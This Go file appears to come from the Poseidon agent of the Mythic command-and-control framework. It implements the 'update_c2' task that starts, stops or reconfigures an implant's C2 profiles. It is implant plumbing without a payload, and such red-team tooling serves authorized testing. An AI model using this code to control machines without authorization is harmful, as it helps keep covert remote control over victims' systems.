package update_c2

import (
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type updateC2Args struct {
	C2Name      string  `json:"c2_name"`
	Action      string  `json:"action"`
	ConfigName  *string `json:"config_name"`
	ConfigValue *string `json:"config_value"`
}

// Run - Function that executes the run command
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := updateC2Args{}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	switch args.Action {
	case "start":
		profiles.StartC2Profile(args.C2Name)
		break
	case "stop":
		profiles.StopC2Profile(args.C2Name)
		break
	case "update":
		if args.ConfigValue == nil || args.ConfigName == nil {
			msg.SetError(fmt.Sprintf("Missing required parameter values for update: configValue and configName"))
			task.Job.SendResponses <- msg
			return
		}
		profiles.UpdateC2Profile(args.C2Name, *args.ConfigName, *args.ConfigValue)
		break
	default:
		msg.SetError(fmt.Sprintf("Unknown action: %s", args.Action))
		task.Job.SendResponses <- msg
		return
	}
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return

}
